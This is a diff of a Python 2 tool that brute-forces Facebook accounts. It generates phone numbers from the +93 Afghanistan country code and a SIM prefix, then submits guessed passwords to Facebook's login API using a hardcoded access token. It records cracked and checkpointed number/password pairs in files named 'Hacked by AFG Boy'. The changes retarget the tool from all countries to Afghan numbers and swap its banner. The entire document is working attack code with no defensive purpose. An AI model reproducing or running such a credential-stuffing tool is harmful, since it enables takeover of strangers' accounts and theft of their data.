@@ -49,49 +49,22 @@ def cb():
 
 
 logo = """
-   ------     _____ 🍂🍂🍂🍂
-______________ 🍂_🍂_ 🍂_🍂
-____________ 🍂__🍂__ 🍂__🍂
-___________ 🍂___🍂__ 🍂___🍂
-__________ 🍂____🍂 __🍂____🍂
-_________ 🍂_____🍂 __🍂 ____🍂
-_________ 🍂_____🍂 __🍂 ____ 🍂
-_________ 🍂_____🍂 __🍂 ____ 🍂
-__________ 🍂____ 🍂__🍂 ___ 🍂
-____________ 🍂___🍂__🍂 __ 🍂
-______________ 🍂🍂🍂🍂🍂
-______🍃🍃_______🌱🌱
-____🍃🍃🍃_______🌱
-___🍃🍃🍃🍃_____🌱
-______🍃🍃🍃_____🌱
-__________🍃_______🌱
-______🍃🍃_🍃____🌱
-____🍃🍃🍃__🍃__🌱
-___🍃🍃🍃_____🍃🌱
-____🍃🍃__________🌱
-____🍃_____________🌱
-____________________🌱
-____________________🌱
-____________________🌱
-________________███__██
-______________███___ ███
-_____________███_____███_██
-____________███______███_███
-___________███______███__███
-_________████_____████__███
-_________████___████___███_██
-_________██████████___███_███
-________███████████_████_███
-________███████████████_███
-________█████████████_█████
-████_███████████████_████
-█████_██████████████_████
-██████_████████████_████
-███████_██████████████
-████████_███████████
-█████████_███████
-██████████
-██████████
+   MMMMMMMM               MMMMMMMM                 
+M:::::::M             M:::::::M                 
+M::::::::M           M::::::::M                 
+M:::::::::M         M:::::::::M                 
+M::::::::::M       M::::::::::M   ooooooooooo   
+M:::::::::::M     M:::::::::::M oo:::::::::::oo 
+M:::::::M::::M   M::::M:::::::Mo:::::::::::::::o
+M::::::M M::::M M::::M M::::::Mo:::::ooooo:::::o
+M::::::M  M::::M::::M  M::::::Mo::::o     o::::o
+M::::::M   M:::::::M   M::::::Mo::::o     o::::o
+M::::::M    M:::::M    M::::::Mo::::o     o::::o
+M::::::M     MMMMM     M::::::Mo::::o     o::::o
+M::::::M               M::::::Mo:::::ooooo:::::o
+M::::::M               M::::::Mo:::::::::::::::o
+M::::::M               M::::::M oo:::::::::::oo 
+MMMMMMMM               MMMMMMMM   oooooooooooo
  
  
    
@@ -109,7 +82,7 @@ def Cybery():
     os.system('clear')
     print logo
     print 42 * '~'
-    print '  [01] CRACK  ALL Country  WITH NUMBERS '
+    print '  [01] Hack afg Facebooks '
     print 42 * '~'
     mohammad()
 
@@ -117,17 +90,17 @@ def Cybery():
 def mohammad():
     global cpb
     global oks
-    bch = raw_input(' ENTER NUMBER >> 01 << ')
+    bch = raw_input(' ENTER NUMBER  >> 1 << to start ')
     if bch == '':
-        print '[!] Fill in correctly'
+        print '[!] Loading '
         mohammad()
-    elif bch == '01':
+    elif bch == '1':
         os.system('clear')
         print logo
-        print '  HACK ALL COUNTRY FB '
+        print '  HACK AFG Facebooks '
         try:
-            k = raw_input(' Enter Country Code : ')
-            c = raw_input(' Enter Range Code ')
+            k = raw_input(' please type +93 : ')
+            c = raw_input(' Enter sim Code like 783 ')
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
@@ -146,7 +119,7 @@ def mohammad():
     psb(' TOTAL   NUMBERS: ' + xxx)
     time.sleep(0.1)
     psb(' PLEAS WHIT...')
-    time.sleep(0.5)
+    time.sleep(0.2)
     print 40 * '~'
 
     def main(arg):
@@ -162,12 +135,12 @@ def mohammad():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  no ' + pass1 + '\n' + '\n'
-                okb = open('save/ Hacked by AFG Boy 😝😌  .txt', 'a')
+                okb = open('save/ Hacked by AFG Boy  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHacked by AFG Boy 😝😌 😝😌 \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
+                print '\x1b[1;92mHacked by AFG Boy \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '   ' + pass1 + '\n')
                 cps.close()
@@ -177,13 +150,13 @@ def mohammad():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  NO  ' + pass1 + '\n' + '\n'
-                okb = open('save/ Hacked by AFG Boy 😝😌 😝😌  .txt', 'a')
+                print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  wrong  ' + pass1 + '\n' + '\n'
+                okb = open('save/ Hacked by AFG Boy  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHacked by AFG Boy 😝😌 😝😌 \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
+                print '\x1b[1;92mHacked by AFG Boy  \x1b[1;92m ' + k + c + user + '  pass  ' + pass2 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '    ' + pass2 + '\n')
                 cps.close()
@@ -195,7 +168,7 @@ def mohammad():
     p.map(main, id)
     print 42 * '\x1b[1;91m='
     print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
-    print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93]\x1b[1;92m Total Ids /\x1b[1;96mcheckpoints : ' + str(len(oks)) + '/' + str(len(cpb))
     print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
     raw_input('\n[Press Enter To Go Back]')
 
